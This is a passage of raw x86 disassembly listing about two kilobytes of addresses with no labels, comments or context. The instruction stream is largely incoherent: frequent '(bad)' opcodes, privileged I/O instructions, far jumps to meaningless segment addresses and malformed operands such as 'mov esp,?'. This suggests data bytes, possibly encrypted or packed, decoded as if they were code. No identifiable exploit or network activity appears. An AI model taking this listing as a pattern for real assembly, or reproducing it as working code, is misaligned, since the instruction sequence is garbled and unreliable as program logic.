  415ab4:	sbb    eax,0x6706c2e0
  415ab9:	leave  
  415aba:	and    bh,ah
  415abc:	sub    ah,BYTE PTR gs:0xebd5b6fc
  415ac3:	(bad)  
  415ac4:	jmp    0xf23864dc
  415ac9:	or     al,0x28
  415acb:	dec    ecx
  415acc:	inc    esi
  415acd:	mov    ch,0x83
  415acf:	sbb    BYTE PTR [eax-0x498b726a],0xbb
  415ad6:	cli    
  415ad7:	push   edx
  415ad8:	outs   dx,DWORD PTR ds:[esi]
  415ad9:	cli    
  415ada:	xor    dh,bh
  415adc:	ins    DWORD PTR es:[edi],dx
  415add:	adc    DWORD PTR [esi+0x3b014929],ecx
  415ae3:	mov    dh,0xc6
  415ae5:	push   eax
  415ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ae7:	mov    ds:0xb43ac922,eax
  415aec:	mov    esi,0xdfb44962
  415af1:	jno    0x415b06
  415af3:	fucomi st,st(0)
  415af5:	fiadd  DWORD PTR [edi+0x5f]
  415af8:	and    al,0x13
  415afa:	mov    ecx,0xcd5f8eb
  415aff:	xor    BYTE PTR [edx-0x7d3e192b],al
  415b05:	ds test eax,0xe464d7cd
  415b0b:	mov    dh,0x68
  415b0d:	(bad)  
  415b0e:	fisttp DWORD PTR [edi+0x12]
  415b11:	or     al,0x98
  415b13:	je     0x415aaf
  415b15:	in     al,dx
  415b16:	into   
  415b17:	inc    dh
  415b19:	test   DWORD PTR [edx-0x738c5d81],ebx
  415b1f:	stos   BYTE PTR es:[edi],al
  415b20:	add    DWORD PTR [ebp+0x3e9829d6],0xffffffb3
  415b27:	sti    
  415b28:	les    eax,FWORD PTR [edi+0x800e0b]
  415b2e:	add    al,0x63
  415b30:	sub    eax,0xbb2df1c1
  415b35:	cdq    
  415b36:	out    dx,eax
  415b37:	in     eax,dx
  415b38:	inc    esp
  415b39:	mov    al,ds:0x20994d0d
  415b3e:	xor    eax,0x76823b54
  415b43:	pop    eax
  415b44:	(bad)  
  415b46:	mov    ebp,0xa46da6bd
  415b4b:	xchg   DWORD PTR [ebp-0x3],esp
  415b4e:	cwde   
  415b4f:	sahf   
  415b50:	call   FWORD PTR [esi]
  415b52:	xchg   esi,eax
  415b53:	enter  0xa9ed,0xb6
  415b57:	imul   DWORD PTR [esi]
  415b59:	popa   
  415b5a:	sbb    edi,ebp
  415b5c:	in     al,dx
  415b5d:	enter  0x7117,0x6e
  415b61:	push   edx
  415b62:	sbb    esi,0xffffff84
  415b65:	push   0xd04a72cd
  415b6a:	dec    edi
  415b6b:	sbb    BYTE PTR [ebp-0x29],dh
  415b6e:	shl    BYTE PTR [edi+0x162cf263],1
  415b74:	sbb    bl,BYTE PTR [eax-0x46]
  415b77:	cmp    dh,BYTE PTR [esi+0x67615c0]
  415b7d:	retf   0xa126
  415b80:	sub    DWORD PTR [esi+0x7039ed73],eax
  415b86:	das    
  415b87:	lock ds push esi
  415b8a:	lds    esp,FWORD PTR [ecx]
  415b8c:	call   0xefca9e62
  415b91:	fs nop
  415b93:	add    ah,BYTE PTR [edx-0x51]
  415b96:	jnp    0x415c05
  415b98:	gs mov bl,0xdc
  415b9b:	mov    ds:0xcfbc5165,eax
  415ba0:	(bad)
  415ba4:	loopne 0x415be7
  415ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ba7:	loop   0x415bb6
  415ba9:	jns    0x415c27
  415bab:	test   DWORD PTR [edi+esi*1],edi
  415bae:	rol    BYTE PTR [ebx-0x2055db48],cl
  415bb4:	aad    0x4a
  415bb6:	or     dl,BYTE PTR [edx+esi*4]
  415bb9:	arpl   cx,ax
  415bbb:	imul   esi,DWORD PTR [edi],0xffffff80
  415bbe:	cmc    
  415bbf:	or     al,0x60
  415bc1:	mov    cs,WORD PTR [edi]
  415bc3:	pop    ds
  415bc4:	mov    dh,0x90
  415bc6:	jle    0x415bd7
  415bc8:	mov    ah,0xdb
  415bca:	dec    ecx
  415bcb:	jnp    0x415b6a
  415bcd:	jmp    0x93c6:0x62fbb3b4
  415bd4:	xor    BYTE PTR [eax-0x3d8bbccf],ah
  415bda:	mov    bh,0x4f
  415bdc:	sbb    eax,0xbe38a2a4
  415be1:	call   0x8edb:0xf58cea9
  415be8:	mov    eax,ds:0xe3362d69
  415bed:	dec    ecx
  415bee:	dec    ebp
  415bef:	loope  0x415b9b
  415bf1:	xchg   DWORD PTR [edi+edi*8-0x1d],esp
  415bf5:	and    DWORD PTR [ebp-0x51],ebx
  415bf8:	inc    edx
  415bf9:	mov    ebp,0x2d0def3b
  415bfe:	sahf   
  415bff:	jp     0x415c6d
  415c01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c02:	mov    ch,0x50
  415c04:	sbb    dh,ch
  415c06:	ja     0x415c45
  415c08:	pop    ds
  415c09:	imul   ebp,DWORD PTR [esi],0x4e
  415c0c:	adc    DWORD PTR [edx-0x280a6158],0xaad632ec
  415c16:	loope  0x415c08
  415c18:	and    DWORD PTR [edi+0x5f],0xb
  415c1c:	test   DWORD PTR [ebx],ebx
  415c1e:	aad    0xc4
  415c20:	std    
  415c21:	dec    esp
  415c22:	scas   al,BYTE PTR es:[edi]
  415c23:	leave  
  415c24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c25:	adc    eax,0x6e942961
  415c2a:	inc    eax
  415c2b:	bound  ebp,QWORD PTR fs:[eax]
  415c2e:	adc    al,bh
  415c30:	push   0x62
  415c32:	leave  
  415c33:	lea    edi,ds:0x2de2cbd0
  415c39:	pop    ecx
  415c3a:	push   eax
  415c3b:	jl     0x415c2d
  415c3d:	pop    DWORD PTR ds:0x6e642ab8
  415c43:	mov    dl,0x9c
  415c45:	rcr    DWORD PTR [ebp-0x797036ce],cl
  415c4b:	mov    edx,0x56b41cee
  415c51:	in     eax,0x63
  415c53:	inc    edx
  415c54:	imul   esi
  415c56:	imul   edx,DWORD PTR [ecx-0x7b4cd74a],0x86275fd5
  415c60:	jns    0x415cbd
  415c62:	cmp    al,0x9f
  415c64:	js     0x415cd5
  415c66:	or     BYTE PTR [esi],dh
  415c68:	xlat   BYTE PTR ds:[ebx]
  415c69:	ds (bad) 
  415c6b:	(bad)  
  415c6c:	dec    ebx
  415c6d:	xchg   ebx,eax
  415c6e:	es mov edi,0x39d4b091
  415c74:	add    DWORD PTR [esi+0x7],ebp
  415c77:	in     al,0xab
  415c79:	dec    ebx
  415c7a:	pop    edi
  415c7b:	lea    edi,ds:0xdcbed371
  415c81:	cs cmp al,0x56
  415c84:	scas   al,BYTE PTR es:[edi]
  415c85:	sbb    ah,BYTE PTR [eax+0x6a7034d1]
  415c8b:	and    dl,bl
  415c8d:	add    ebx,DWORD PTR [edi]
  415c8f:	sti    
  415c90:	jb     0x415c35
  415c92:	iret   
  415c93:	inc    eax
  415c94:	mov    ch,0x5b
  415c96:	jg     0x415cbc
  415c98:	pusha  
  415c99:	mov    eax,ds:0x3dfbfece
  415c9e:	iret   
  415c9f:	repnz sbb bl,BYTE PTR [eax-0x16]
  415ca3:	sbb    eax,edi
  415ca5:	(bad)  
  415ca6:	sub    bh,BYTE PTR [ebp-0x65]
  415ca9:	push   ecx
  415caa:	inc    ebp
  415cab:	aas    
  415cac:	sbb    edx,DWORD PTR [eax+0x76]
  415caf:	fs ja  0x415c9f
  415cb2:	nop
  415cb3:	sbb    al,0x8c
  415cb5:	ret    0x2400
  415cb8:	pop    edx
  415cb9:	xchg   BYTE PTR [edi],ah
  415cbb:	cmp    ah,cl
  415cbd:	rol    BYTE PTR [edi-0x472323c5],cl
  415cc3:	pop    es
  415cc4:	mov    ebx,0xd6d0b9fb
  415cc9:	jp     0x415c9f
  415ccb:	and    eax,0x1a361610
  415cd0:	push   ebp
  415cd1:	clc    
  415cd2:	shl    esp,0x18
  415cd5:	mov    dh,0x7c
  415cd7:	pop    ss
  415cd8:	mov    ds:0x49b00f6,eax
  415cdd:	test   al,0xaa
  415cdf:	sub    dl,BYTE PTR [ebp-0x14]
  415ce2:	dec    esp
  415ce3:	and    bh,cl
  415ce5:	jae    0x415d00
  415ce7:	cwde   
  415ce8:	and    DWORD PTR [edi-0x46],0x26
  415cec:	loope  0x415cac
  415cee:	and    al,0xb5
  415cf0:	int    0x72
  415cf2:	jbe    0x415ca5
  415cf4:	loop   0x415ce2
  415cf6:	ss das 
  415cf8:	data16 aaa 
  415cfa:	xchg   ecx,eax
  415cfb:	and    esi,DWORD PTR [ebp+0x4811a043]
  415d01:	data16 and bh,BYTE PTR [edi-0xf]
  415d05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d06:	enter  0x26fc,0x8
  415d0a:	sbb    DWORD PTR [eax],edx
  415d0c:	cli    
  415d0d:	mov    ebx,0x1b454f99
  415d12:	call   0xa66f:0x58ac51e1
  415d19:	int3   
  415d1a:	xor    esi,ebp
  415d1c:	repnz mov esi,ebp
  415d1f:	out    0x63,al
  415d21:	adc    BYTE PTR [edi+0x5],0x69
  415d25:	cmp    al,0x26
  415d27:	xchg   ebx,eax
  415d28:	stos   DWORD PTR es:[edi],eax
  415d29:	retf   0xf0b3
  415d2c:	test   eax,esp
  415d2e:	adc    cl,dh
  415d30:	lds    ebx,FWORD PTR [edi+esi*8-0x66]
  415d34:	call   0xfeed:0x373eaa3a
  415d3b:	sub    edi,eax
  415d3d:	out    dx,al
  415d3e:	popa   
  415d3f:	adc    cl,BYTE PTR [eax]
  415d41:	addr16 or ah,ah
  415d44:	or     ecx,0x91ae785b
  415d4a:	pop    esi
  415d4b:	mov    ds:0xdb5a9858,al
  415d50:	or     al,0xc4
  415d52:	inc    ecx
  415d53:	int    0x5e
  415d55:	add    DWORD PTR [eax+0x41],ebx
  415d58:	and    al,0xe6
  415d5a:	xchg   DWORD PTR [ebx],edx
  415d5c:	rol    BYTE PTR [eax-0x5a],cl
  415d5f:	fucomp st(2)
  415d61:	add    eax,0x3c7b9767
  415d66:	dec    esp
  415d67:	xchg   edx,eax
  415d68:	add    eax,0xcf66bfe
  415d6d:	pmaxub mm5,QWORD PTR [edx+edi*1+0x53]
  415d72:	in     al,dx
  415d73:	rcr    BYTE PTR ds:0x5b3b7e5d,cl
  415d79:	xchg   ebp,eax
  415d7a:	inc    edx
  415d7b:	out    0x64,al
  415d7d:	imul   ebx,DWORD PTR [edi-0x2efe80a9],0x2f1f52ef
  415d87:	cmc    
  415d88:	arpl   WORD PTR [esp+ecx*2],bx
  415d8b:	xchg   edi,eax
  415d8c:	mov    al,0x90
  415d8e:	test   eax,0x1b2409b1
  415d93:	dec    edx
  415d94:	mov    al,ds:0xb29d45df
  415d99:	mov    edi,0x54f760b3
  415d9e:	pop    esi
  415d9f:	mov    dh,0xfa
  415da1:	loope  0x415dc7
  415da3:	push   ss
  415da4:	add    DWORD PTR [edi-0x26],esp
  415da7:	cld    
  415da8:	jmp    0x9fda3076
  415dad:	adc    BYTE PTR [bp+si+0x123e],al
  415db2:	popf   
  415db3:	aas    
  415db4:	and    eax,0x201cadb5
  415db9:	inc    edx
  415dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dbb:	imul   edi,DWORD PTR [ecx+0x4b3e41f3],0xffffffe8
  415dc2:	or     DWORD PTR [edx],0x4e
  415dc5:	dec    ecx
  415dc6:	jb     0x415df3
  415dc8:	add    eax,0x9f63bf72
  415dcd:	adc    DWORD PTR [eax],edi
  415dcf:	das    
  415dd0:	sub    BYTE PTR [eax-0x3a1e95fd],ch
  415dd6:	xchg   DWORD PTR [edx+0x10],eax
  415dd9:	clc    
  415dda:	cmp    esi,DWORD PTR [esi-0x70]
  415ddd:	aam    0x24
  415ddf:	dec    edi
  415de0:	(bad)
  415de3:	sbb    al,0xd2
  415de5:	js     0x415daf
  415de7:	push   esi
  415de8:	cdq    
  415de9:	xchg   BYTE PTR [edi+edi*4],al
  415dec:	mov    esi,0x1d7d99e2
  415df1:	mov    dh,BYTE PTR [ecx-0x4726a3dd]
  415df7:	mov    ds:0x13f7d1c8,eax
  415dfc:	push   0x35
  415dfe:	les    esp,FWORD PTR [esi+0x6a9b91b2]
  415e04:	aas    
  415e05:	test   DWORD PTR ds:0x6e6b3abc,ebx
  415e0b:	add    DWORD PTR [edi-0x55],eax
  415e0e:	fs inc ebx
  415e10:	jge    0x415e52
  415e12:	push   esi
  415e13:	push   DWORD PTR [esi-0x31]
  415e16:	lods   al,BYTE PTR ds:[esi]
  415e17:	and    DWORD PTR [esi+0xe391b34],ecx
  415e1d:	pop    ecx
  415e1e:	out    0xfc,al
  415e20:	cmc    
  415e21:	sti    
  415e22:	shl    ecx,0xa3
  415e25:	dec    edx
  415e26:	into   
  415e27:	inc    eax
  415e28:	and    bl,0xf3
  415e2b:	mov    ds:0x5d0f5214,al
  415e30:	jmp    0x415dcb
  415e32:	pop    ss
  415e33:	bound  eax,QWORD PTR [edi]
  415e35:	sti    
  415e36:	shr    esi,1
  415e38:	js     0x415e1b
  415e3a:	mov    ds:0xffcb4d86,eax
  415e3f:	dec    eax
  415e40:	nop
  415e41:	in     al,0x88
  415e43:	inc    esi
  415e44:	push   0x79
  415e46:	lds    edi,FWORD PTR [ebx+0x5f9b9875]
  415e4c:	lock cwde 
  415e4e:	xchg   ebp,eax
  415e4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e50:	jae    0x415e76
  415e52:	ja     0x415eb3
  415e54:	ins    DWORD PTR es:[edi],dx
  415e55:	sbb    eax,0x1f824d1f
  415e5a:	fsubr  QWORD PTR [ecx+0x43]
  415e5d:	stos   DWORD PTR es:[edi],eax
  415e5e:	mov    ebp,0x2629a3d
  415e63:	sti    
  415e64:	(bad)  [ebx]
  415e66:	out    dx,al
  415e67:	cli    
  415e68:	mov    dh,0x54
  415e6a:	bound  esi,QWORD PTR [esi]
  415e6c:	test   edx,esi
  415e6e:	sbb    BYTE PTR [eax],cl
  415e70:	xor    DWORD PTR [ecx+0x29bc17e5],eax
  415e76:	jge    0x415e07
  415e78:	or     esi,DWORD PTR [ebx+0x39]
  415e7b:	ins    DWORD PTR es:[edi],dx
  415e7c:	fsqrt  
  415e7e:	sbb    BYTE PTR [ebp-0x52398ac],dl
  415e84:	xor    ecx,DWORD PTR [edi]
  415e86:	xor    edx,DWORD PTR [ebp+0x45e0947b]
  415e8c:	call   0x9fa0efc5
  415e91:	ret    0x93ce
  415e94:	mov    eax,0x21c90712
  415e9a:	loope  0x415ec5
  415e9c:	mov    al,ds:0xce62f63c
  415ea1:	mov    edx,0x64ac8ea9
  415ea6:	xchg   BYTE PTR [ebx-0x73ec979f],ch
  415eac:	push   esp
  415ead:	push   ebp
  415eae:	cmp    WORD PTR [ebx],bp
  415eb1:	dec    edi
  415eb2:	(bad)  
  415eb3:	dec    BYTE PTR [esi]
  415eb5:	fst    QWORD PTR [ebp-0x46]
  415eb8:	jmp    FWORD PTR [edi]
  415eba:	xchg   BYTE PTR [edi-0x129c87b2],ah
  415ec0:	mov    dh,0x5a
  415ec2:	dec    ebp
  415ec3:	icebp  
  415ec4:	popa   
  415ec5:	xchg   ebx,eax
  415ec6:	dec    ebx
  415ec7:	in     al,dx
  415ec8:	jnp    0x415ed4
  415eca:	lds    edx,FWORD PTR [eax-0x4ac847c8]
  415ed0:	jge    0x415e7b
  415ed2:	or     esi,DWORD PTR [edi+0x4d]
  415ed5:	gs push ebp
  415ed7:	sti    
  415ed8:	test   al,0xb1
  415eda:	out    dx,eax
  415edb:	jo     0x415eb7
  415edd:	jmp    0x68c6:0x503bacf1
  415ee4:	fnsave [edi-0x44]
  415ee7:	fdiv   QWORD PTR [eax]
  415ee9:	gs (bad) 
  415eeb:	aaa    
  415eec:	push   ss
  415eed:	inc    ebx
  415eee:	mov    esp,0xd8d2dcd3
  415ef3:	loopne 0x415f01
  415ef5:	ficomp WORD PTR ss:0x3feb974e
  415efc:	jo     0x415ebc
  415efe:	cmp    DWORD PTR [edi],ecx
  415f00:	mov    esi,DWORD PTR ds:0x642ffda3
  415f06:	mov    WORD PTR es:[ebp-0x5f54b42c],cs
  415f0d:	mov    bh,0xc5
  415f0f:	xchg   ebp,eax
  415f10:	adc    al,0x5c
  415f12:	in     eax,0xcb
  415f14:	pushf  
  415f15:	adc    bl,BYTE PTR [eax-0x5cfa5b58]
  415f1b:	pop    edx
  415f1c:	jo     0x415eb3
  415f1e:	mov    dl,0x63
  415f20:	in     eax,0x60
  415f22:	xor    bh,al
  415f24:	pop    ebx
  415f25:	mov    ah,BYTE PTR [eax]
  415f27:	out    dx,al
  415f28:	pop    ebp
  415f29:	fs mov ch,0xa8
  415f2c:	bound  esp,QWORD PTR [ebp+0x32]
  415f2f:	inc    edi
  415f30:	cmp    eax,0x48db5849
  415f35:	cmp    al,0xb0
  415f37:	and    eax,0xa8f03248
  415f3c:	xchg   eax,eax
  415f3e:	and    bl,BYTE PTR [esi-0x18]
  415f41:	repz sbb al,0x91
  415f44:	or     DWORD PTR [edi-0x6b4a4141],edi
  415f4a:	xor    BYTE PTR [ecx+eax*1+0x7d],cl
  415f4e:	call   0x6fed5e99
  415f53:	jb     0x415fc7
  415f55:	sbb    DWORD PTR [ecx+0x37],edi
  415f58:	icebp  
  415f59:	int    0xd3
  415f5b:	or     ah,dl
  415f5d:	retf   
  415f5e:	push   0x6bf7d2c9
  415f63:	xor    al,al
  415f65:	test   DWORD PTR [ebx+0x73],ecx
  415f68:	xor    BYTE PTR [ebx+0x71d356bb],al
  415f6e:	iret   
  415f6f:	cdq    
  415f70:	mov    eax,ds:0xd7e98bbd
  415f75:	mov    eax,ds:0xaaeace90
  415f7a:	fnstsw WORD PTR [esp+edx*8+0x27]
  415f7e:	pop    ecx
  415f7f:	sahf   
  415f80:	aad    0x7a
  415f82:	push   edx
  415f83:	push   esi
  415f84:	hlt    
  415f85:	stos   BYTE PTR es:[edi],al
  415f86:	loopne 0x415f94
  415f88:	add    BYTE PTR [edi],bl
  415f8a:	sbb    cl,BYTE PTR [eax-0x39]
  415f8d:	and    eax,0xa131b4af
  415f92:	dec    ecx
  415f93:	mov    ebx,0xa4021add
  415f98:	js     0x415f92
  415f9a:	cmp    al,0xa
  415f9c:	mov    eax,ds:0x2326746e
  415fa1:	pop    esp
  415fa2:	iret   
  415fa3:	icebp  
  415fa4:	jl     0x415f72
  415fa6:	je     0x415f99
  415fa8:	aam    0x99
  415faa:	pusha  
  415fab:	clc    
  415fac:	dec    eax
  415fad:	jmp    0xb4e4:0xa2bc8ce9
  415fb4:	jns    0x415feb
  415fb6:	cld    
  415fb7:	push   0xca71c51
  415fbc:	sahf   
  415fbd:	sbb    dh,dl
  415fbf:	sbb    BYTE PTR [ebx+eiz*4+0x4f],0xd
  415fc4:	js     0x415f7f
  415fc6:	jmp    0xfdc9c1fe
  415fcb:	jnp    0x416039
  415fcd:	jns    0x415fd3
  415fcf:	or     eax,0x39185504
  415fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fd5:	pop    ebx
  415fd6:	sbb    al,0x78
  415fd8:	mov    bl,dh
  415fda:	aam    0xdd
  415fdc:	add    esi,DWORD PTR [edi+0x6d]
  415fdf:	dec    esi
  415fe0:	enter  0x5382,0x29
  415fe4:	iret   
  415fe5:	jo     0x415f78
  415fe7:	cmp    dl,BYTE PTR [eax]
  415fe9:	es popf 
  415feb:	cli    
  415fec:	call   FWORD PTR [ecx+0x5e5c80fd]
  415ff2:	jmp    0x415ff0
  415ff4:	ja     0x415fe3
  415ff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ff7:	inc    ebx
  415ff8:	adc    al,0xc5
  415ffa:	xchg   ebp,eax
  415ffb:	inc    edi
  415ffc:	das    
  415ffd:	loopne 0x415fcd
  415fff:	jmp    0x415ff9
  416001:	or     BYTE PTR [eax-0x5229189a],ah
  416007:	gs ds jno 0x415ff4
  41600b:	dec    ebp
  41600c:	in     al,0x43
  41600e:	push   esp
  41600f:	adc    edx,edx
  416011:	jb     0x416001
  416013:	sub    ch,BYTE PTR [eax]
  416015:	(bad)  
  416016:	lahf   
  416017:	mov    ebx,0x7d8288da
  41601c:	es ret 
  41601e:	ins    BYTE PTR es:[edi],dx
  41601f:	fcomp  DWORD PTR [ecx]
  416021:	aam    0xab
  416023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416024:	or     dh,ch
  416026:	push   edx
  416027:	je     0x416096
  416029:	scas   al,BYTE PTR es:[edi]
  41602a:	test   DWORD PTR [ecx+0x7c8641b8],ebp
  416030:	dec    esi
  416031:	or     al,0xb2
  416033:	aaa    
  416034:	mov    dl,0x3f
  416036:	dec    ebp
  416037:	xchg   DWORD PTR [eax+esi*8+0x57f1e10f],esp
  41603e:	fbstp  TBYTE PTR [esi+edi*1]
  416041:	inc    eax
  416042:	adc    ebp,0xbf7cc3d3
  416048:	cli    
  416049:	pop    ss
  41604a:	sub    ecx,DWORD PTR [esi+0x1d]
  41604d:	pop    ebx
  41604e:	jno    0x41602e
  416050:	add    eax,0x8dd87e14
  416055:	je     0x4160c8
  416057:	inc    ecx
  416058:	cwde   
  416059:	lods   al,BYTE PTR ds:[esi]
  41605a:	add    DWORD PTR [edx+0x77],ebp
  41605d:	inc    ebp
  41605e:	add    cl,al
  416060:	adc    DWORD PTR [esi-0x457cf67b],ebp
  416066:	stc    
  416067:	mov    bh,0x52
  416069:	sub    DWORD PTR [eax],edi
  41606b:	and    DWORD PTR [ebx-0x4],eax
  41606e:	inc    ecx
  41606f:	loopne 0x41604d
  416071:	jl     0x4160ed
  416073:	mov    ds:0x29986f08,eax
  416078:	mov    bl,0xc7
  41607a:	lods   eax,DWORD PTR ds:[esi]
  41607b:	mov    edi,0xd2d5f084
  416080:	inc    ecx
  416081:	(bad)  
  416082:	mov    ebp,0xca2289ab
  416087:	mov    ch,0xca
  416089:	mov    esp,?
  41608b:	jns    0x4160d6
  41608d:	add    eax,ebp
  41608f:	and    al,0xe5
  416091:	shr    BYTE PTR [edx+0x4f],1
  416094:	ret    0x1924
  416097:	fsub   DWORD PTR [edx-0x3a]
  41609a:	into   
  41609b:	and    ch,BYTE PTR [edi-0x1af6047c]
  4160a1:	lock jg 0x4160cc
  4160a4:	sub    DWORD PTR [ebx+ebx*4-0x7c],ebp
  4160a8:	test   DWORD PTR [esi+0x60],esi
  4160ab:	mov    al,ds:0x2cc03b49
  4160b0:	push   edi
  4160b1:	cld    
  4160b2:	push   0x48dd626c
  4160b7:	lods   eax,DWORD PTR ds:[esi]
  4160b8:	lods   eax,DWORD PTR ds:[esi]
  4160b9:	pop    ss
  4160ba:	or     al,0x7d
  4160bc:	sahf   
  4160bd:	and    esi,DWORD PTR [ebx+0x1544e1a9]
  4160c3:	nop
  4160c4:	jns    0x4160b6
  4160c6:	ins    BYTE PTR es:[edi],dx
  4160c7:	jge    0x416053
  4160c9:	xchg   ebp,eax
  4160ca:	mov    BYTE PTR [edx],dh
  4160cc:	sub    DWORD PTR [ebx-0x506a7699],edx
  4160d2:	cmp    al,0xed
  4160d4:	aad    0xe8
  4160d6:	xchg   esp,eax
  4160d7:	mul    DWORD PTR [eax]
  4160d9:	inc    ebp
  4160da:	aaa    
  4160db:	pushf  
  4160dc:	loopne 0x4160c5
  4160de:	lea    esp,[ebx+0x11b90b61]
  4160e4:	stos   DWORD PTR es:[edi],eax
  4160e5:	mov    al,0x3a
  4160e7:	addr16 xchg ebx,eax
  4160e9:	rcr    BYTE PTR [esi-0x34],0xa0
  4160ed:	jbe    0x416096
  4160ef:	ss cmc 
  4160f1:	inc    ebx
  4160f2:	cmp    esi,DWORD PTR [ebx]
  4160f4:	adc    DWORD PTR [ebp+0x3dbf98fd],ebx
  4160fa:	mov    al,0xa9
  4160fc:	sar    BYTE PTR [ecx+0x2a],0xe7
  416100:	sub    eax,DWORD PTR [ebx-0x17ab8fd9]
  416106:	mov    dl,0xb0
  416108:	push   ss
  416109:	mov    ds:0x7aaa979a,al
  41610e:	inc    ebx
  41610f:	imul   esi,DWORD PTR [esi-0x27],0xd62313bb
  416116:	pop    eax
  416117:	scas   eax,DWORD PTR es:[edi]
  416118:	push   es
  416119:	dec    ebx
  41611a:	xor    al,0x91
  41611c:	ins    BYTE PTR es:[edi],dx
  41611d:	ds xor al,0xb6
  416120:	add    al,0x40
  416122:	or     DWORD PTR [ecx-0x28b3d09e],edx
  416128:	mov    ds:0xbf501171,eax
  41612d:	mov    ?,esp
  41612f:	or     BYTE PTR [ebp+0x2b],cl
  416132:	shl    BYTE PTR [ebx],0x47
  416135:	pusha  
  416136:	ins    DWORD PTR es:[edi],dx
  416137:	mov    cl,BYTE PTR [eax-0x8ea3416]
  41613d:	rcr    ebp,1
  41613f:	dec    edi
  416140:	(bad)
  416144:	add    esi,DWORD PTR [edi+0x78]
  416147:	int3   
  416148:	dec    edx
  416149:	bound  ebp,QWORD PTR [esi+0x74]
  41614c:	aad    0x4d
  41614e:	aad    0xab
  416150:	and    dl,BYTE PTR [edi-0x3ea66d97]
  416156:	sti    
  416157:	adc    BYTE PTR [ebp-0x5c],ah
  41615a:	dec    ebx
  41615b:	pop    ebp
  41615c:	adc    DWORD PTR [ebx+edx*1],ecx
  41615f:	test   esp,esi
  416161:	push   eax
  416162:	stos   DWORD PTR es:[edi],eax
  416163:	cwde   
  416164:	push   edi
  416165:	mov    eax,DWORD PTR es:[edi+edi*8]
  416169:	(bad)  [esi]
  41616b:	inc    esi
  41616c:	(bad)  
  41616d:	out    dx,al
  41616e:	not    dh
  416170:	mov    ds:0x6cbab22c,al
  416175:	mov    al,ds:0x2c24ec11
  41617a:	or     al,0x7f
  41617c:	outs   dx,DWORD PTR ds:[esi]
  41617d:	test   BYTE PTR [eax],cl
  41617f:	cmp    edi,DWORD PTR [edi]
  416181:	loopne 0x416166
  416183:	dec    esi
  416184:	xchg   ebp,eax
  416185:	das    
  416186:	xor    ecx,DWORD PTR [ecx-0x36]
  416189:	fdivr  DWORD PTR [edx-0x3403ed88]
  41618f:	out    dx,al
  416190:	sbb    al,0x5c
  416192:	cmp    al,cl
  416194:	ins    DWORD PTR es:[edi],dx
  416195:	fiadd  WORD PTR [ecx-0x5cb77076]
  41619b:	sub    al,0x8d
  41619d:	xchg   ebp,eax
  41619e:	and    BYTE PTR ds:0x71eaa00e,0xeb
  4161a5:	mov    edi,0xebc9c021
  4161aa:	scas   al,BYTE PTR es:[edi]
  4161ab:	lods   eax,DWORD PTR ds:[esi]
  4161ac:	adc    ah,BYTE PTR [ebp+0x132c3e3e]
  4161b2:	or     BYTE PTR [ebp+0x147b89c],bh
  4161b8:	sub    ebp,edi
  4161ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161bb:	imul   eax,DWORD PTR [ebx+0x10ba64bd],0x7597882b
  4161c5:	pop    edi
  4161c6:	test   DWORD PTR [ecx],ebx
  4161c8:	stc    
  4161c9:	int3   
  4161ca:	retf   0xb708
  4161cd:	pop    ebx
  4161ce:	mov    ecx,DWORD PTR [esi]
  4161d0:	or     cl,0x90
  4161d3:	or     DWORD PTR [eax+ebx*8+0x2d0c16ac],esp
  4161da:	sar    BYTE PTR [ecx+eiz*8+0x20],1
  4161de:	cdq    
  4161df:	scas   al,BYTE PTR es:[edi]
  4161e0:	mov    edx,0x93db3664
  4161e5:	shl    DWORD PTR [ebp+0x64],0xd8
  4161e9:	sbb    eax,DWORD PTR [ecx-0x97a76cc]
  4161ef:	nop
  4161f0:	pmaddwd mm2,QWORD PTR [ebx]
  4161f3:	mov    ecx,0xb3935721
  4161f8:	dec    edi
  4161f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161fa:	cwde   
  4161fb:	xchg   DWORD PTR [edx+0x7a],esi
  4161fe:	push   ebx
  4161ff:	ret    
  416200:	test   eax,0x4136fcdd
  416205:	mov    eax,ds:0x10c6d732
  41620a:	and    edi,edi
  41620c:	les    edx,FWORD PTR [ecx-0xa72829a]
  416212:	call   0x78626ea
  416217:	pusha  
  416218:	sub    al,0xad
  41621a:	cmovge esp,DWORD PTR [edi+0x22]
  41621e:	pushf  
  41621f:	(bad)  
  416220:	out    dx,eax
  416221:	lods   al,BYTE PTR ds:[esi]
  416222:	fs push eax
  416224:	sbb    al,0x3
  416226:	test   eax,0x928e5386
  41622b:	scas   eax,DWORD PTR es:[edi]
  41622c:	xor    ecx,DWORD PTR [ebx+0x7c]
  41622f:	mov    ebp,0xf9b04c70
  416234:	outs   dx,BYTE PTR ds:[esi]
  416235:	cmp    al,BYTE PTR [edi]
  416237:	mov    al,0xce
  416239:	jbe    0x416211
  41623b:	std    
  41623c:	adc    eax,0xcc9eca99
  416241:	jecxz  0x41624f
  416243:	pop    ecx
  416244:	es je  0x4161f7
  416247:	daa    
  416248:	pop    edx
  416249:	ss icebp 
  41624b:	cmp    BYTE PTR [edi+edx*8],ch
  41624e:	inc    edi
  41624f:	je     0x416277
  416251:	pop    edx
  416252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416253:	sar    ebx,0x96
  416256:	in     al,0x5f
  416258:	sub    esp,DWORD PTR [ebx]
  41625a:	pop    ss
  41625b:	xchg   edx,eax
  41625c:	push   es
  41625d:	ja     0x416254
  41625f:	popf   
  416260:	test   al,0x49
  416262:	in     eax,0x18
  416264:	fstp   DWORD PTR [ebp+0x43]
  416267:	pop    es
  416268:	mov    ebx,0xa284ce4
  41626d:	cmp    al,0x52
  41626f:	mov    ds:0xdf8b0142,al
  416274:	sbb    BYTE PTR [ecx-0x18ee97f4],0x9d
  41627b:	and    esp,edi
  41627d:	add    DWORD PTR [edi+0x3d],esp
  416280:	mov    bh,0xc0
  416282:	ret    
  416283:	add    ecx,eax
  416285:	ret    0x82f
